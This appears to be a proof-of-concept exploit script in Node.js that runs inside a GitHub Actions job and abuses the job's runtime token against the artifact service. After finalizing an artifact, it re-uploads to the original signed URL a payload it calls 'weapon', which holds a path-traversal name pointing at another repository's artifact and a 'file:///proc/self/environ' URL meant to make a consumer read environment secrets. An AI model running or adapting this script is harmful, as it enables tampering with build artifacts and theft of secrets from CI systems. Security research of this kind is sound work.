const crypto = require('crypto');
(async () => {
  const token = process.env.ACTIONS_RUNTIME_TOKEN;
  const base = new URL(process.env.ACTIONS_RESULTS_URL).origin;
  const scp = JSON.parse(Buffer.from(token.split('.')[1], 'base64url').toString('utf8')).scp;
  const parts = scp.split(' ').find(s => s.startsWith('Actions.Results:')).split(':');
  const runId = parts[1], jobId = parts[2];
  const name = 'glm1rp-' + Date.now() + '.json';
  const create = async () => fetch(base + '/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + token },
    body: JSON.stringify({ workflow_run_backend_id: runId, workflow_job_run_backend_id: jobId, name, mime_type: 'application/json', version: 7 })
  });
  let cr = await create();
  let cj = await cr.json().catch(() => ({}));
  let sas = cj.signedUploadUrl || cj.signed_upload_url;
  if (!sas) { console.log('create', cr.status, JSON.stringify(cj).slice(0,140)); process.exit(2); }
  const placeholder = Buffer.from('{"full_name":"PLACEHOLDER"}');
  let pr = await fetch(sas, { method: 'PUT', headers: { 'Content-Type': 'application/json', 'x-ms-blob-type': 'BlockBlob' }, body: placeholder });
  console.log('PUT1', pr.status);
  const fin = async (buf) => fetch(base + '/twirp/github.actions.results.api.v1.ArtifactService/FinalizeArtifact', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + token },
    body: JSON.stringify({ workflow_run_backend_id: runId, workflow_job_run_backend_id: jobId, name, size: String(buf.length), hash: 'sha256:' + crypto.createHash('sha256').update(buf).digest('hex') })
  });
  let fr = await fin(placeholder);
  let fj = await fr.json().catch(() => ({}));
  const id = fj.artifact_id || fj.artifactId;
  console.log('FIN1', fr.status, 'id', id);
  // THE TEST: re-PUT the ORIGINAL sas with new bytes embedding the now-known id
  await new Promise(r => setTimeout(r, 1500));
  const weapon = Buffer.from(JSON.stringify({ full_name: 'a/../../repos/lemonsour864/cassette/actions/artifacts/' + id + '/zip', owner: { login: 'u', avatar_url: 'file:///proc/self/environ' } }));
  pr = await fetch(sas, { method: 'PUT', headers: { 'Content-Type': 'application/json', 'x-ms-blob-type': 'BlockBlob' }, body: weapon });
  console.log('REPUT', pr.status, 'weaponLen', weapon.length);
  // optional re-finalize with the weapon hash
  fr = await fin(weapon);
  fj = await fr.json().catch(() => ({}));
  console.log('FIN2', fr.status, 'id', fj.artifact_id || fj.artifactId, JSON.stringify(fj).slice(0,120));
  console.log('ARTIFACT_ID=' + id);
})().catch(e => { console.log('ERR', e.message); process.exit(1); });
